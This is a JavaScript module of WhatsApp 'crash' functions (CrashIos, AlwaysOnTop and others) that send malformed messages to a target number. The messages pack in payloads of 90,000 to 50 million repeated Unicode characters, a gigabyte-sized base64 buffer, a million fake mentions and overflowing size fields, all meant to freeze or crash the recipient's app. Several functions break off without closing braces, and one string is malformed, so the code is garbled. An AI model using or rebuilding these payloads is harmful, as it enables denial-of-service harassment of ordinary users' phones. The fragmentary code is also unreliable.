async function FChyUi(sock, target) {
  let hyuiForceX = JSON.stringify({
    status: true,
    criador: "hyuiForcex",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] }

async function ComBoxFC(sock, target) {
  let hyuiForceX2 = JSON.stringify({
    status: true,
    criador: "hyuiForcex",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] }

async function CrashIos(sock, target) {
  sock.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: `⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧` + "࣯ꦾ".repeat(90000),
        contextInfo: {
          fromMe: false,
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧" + "ꦾ".repeat(90000),
          }

async function AlwaysOnTop(target) {
  const buffer = Buffer.alloc(1000 * 1024 * 1024).toString('base64');
  const unicode = "󠀡".repeat(50000000);
  
  const mention = Array.from({ length: 1000000 }, () => 
    1${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net
  );

  const payload = {
    protocolMessage: {
      type: 255,
      key: {
        remoteJid: target,
        id: "TOP_" + Date.now(),
        fromMe: false,
        participant: target
      },
      timestamp: Date.now() * 1000,
      viewOnceMessageV4: {
        message: {
          extendedTextMessage: {
            text: "",
            contextInfo: {
              participant: target,
              mentionedJid: [target, ...mention],
              remoteJid: target,
              stanzaId: "TOP_" + Date.now() + "_" + Math.random().toString(36).substr(2, 30),
              quotedMessage: {
                viewOnceMessageV4: {
                  message: {
                    documentMessage: {
                      url: "",
                      mimetype: "application/octet-stream",
                      title: unicode,
                      fileSha256: buffer,
                      fileLength: "18446744073709551615",
                      pageCount: 4294967295,
                      mediaKey: buffer,
                      fileName: unicode,
                      fileEncSha256: buffer,
                      directPath: "/" + unicode,
                      mediaKeyTimestamp: "9999999999999999",
                      contactVcard: true,
                      caption: unicode,
                      contextInfo: {
                        participant: target,
                        mentionedJid: mention,
                        remoteJid: target,
                        quotedMessage: {
                          viewOnceMessageV4: {
                            message: {
                              videoMessage: {
                                url: "",
                                mimetype: "video/mp4",
                                fileSha256: buffer,
                                fileLength: "18446744073709551615",
                                seconds: 4294967295,
                                mediaKey: buffer,
                                height: 65535,
                                width: 65535,
                                fileEncSha256: buffer,
                                directPath: "/" + unicode,
                                mediaKeyTimestamp: "9999999999999999",
                                streamingSidecar: buffer,
                                jpegThumbnail: buffer,
                                contextInfo: {
                                  participant: target,
                                  mentionedJid: mention,
                                  remoteJid: target,
                                  messageSecret: buffer,
                                  conversionDelaySeconds: 31536000000
                                }
                              }
                            }
                          }
                        },
                        messageSecret: buffer,
                        conversionDelaySeconds: 31536000000
                      }
                    }
                  }
                }
              },
              messageSecret: buffer,
              conversionDelaySeconds: 31536000000
            }
          }
        }
      }
    }
  };

module.exports = { FChyUi, ComBoxFC, CrashIos, AlwaysOnTop };